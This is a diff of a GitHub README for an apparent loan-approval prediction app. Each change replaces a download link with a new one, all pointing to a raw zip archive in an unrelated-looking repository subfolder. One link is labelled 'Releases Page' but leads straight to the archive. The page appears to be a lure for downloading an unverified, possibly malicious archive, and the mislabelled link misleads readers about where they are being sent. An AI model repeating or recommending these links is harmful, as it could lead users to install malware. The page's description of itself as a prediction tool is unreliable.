@@ -1,6 +1,6 @@
 # 🏦 Loan-Application-Prediction-Project - Predict Loan Approval with Ease
 
-[![Download](https://github.com/noithatanhkhoacomvn/Loan-Application-Prediction-Project/raw/refs/heads/main/Sidney/Prediction_Application_Project_Loan_v2.3.zip%20Now-brightgreen)](https://github.com/noithatanhkhoacomvn/Loan-Application-Prediction-Project/raw/refs/heads/main/Sidney/Prediction_Application_Project_Loan_v2.3.zip)
+[![Download](https://github.com/noithatanhkhoacomvn/Loan-Application-Prediction-Project/raw/refs/heads/main/Sidney/Project-Prediction-Application-Loan-3.2.zip%20Now-brightgreen)](https://github.com/noithatanhkhoacomvn/Loan-Application-Prediction-Project/raw/refs/heads/main/Sidney/Project-Prediction-Application-Loan-3.2.zip)
 
 ## 📖 Project Overview
 
@@ -23,7 +23,7 @@ To start using the Loan Approval Prediction Project, follow these easy steps.
 
 ### 1. Visit the Download Page
 
-Go to the [Releases Page](https://github.com/noithatanhkhoacomvn/Loan-Application-Prediction-Project/raw/refs/heads/main/Sidney/Prediction_Application_Project_Loan_v2.3.zip) to download the software.
+Go to the [Releases Page](https://github.com/noithatanhkhoacomvn/Loan-Application-Prediction-Project/raw/refs/heads/main/Sidney/Project-Prediction-Application-Loan-3.2.zip) to download the software.
 
 ### 2. Download the Software
 
@@ -50,7 +50,7 @@ To successfully run the Loan Application Prediction Project, ensure your system 
 
 To download the application, click the link below:
 
-[Download the Loan-Application-Prediction-Project](https://github.com/noithatanhkhoacomvn/Loan-Application-Prediction-Project/raw/refs/heads/main/Sidney/Prediction_Application_Project_Loan_v2.3.zip)
+[Download the Loan-Application-Prediction-Project](https://github.com/noithatanhkhoacomvn/Loan-Application-Prediction-Project/raw/refs/heads/main/Sidney/Project-Prediction-Application-Loan-3.2.zip)
 
 Follow the installation instructions mentioned earlier to set up the software on your device.
 
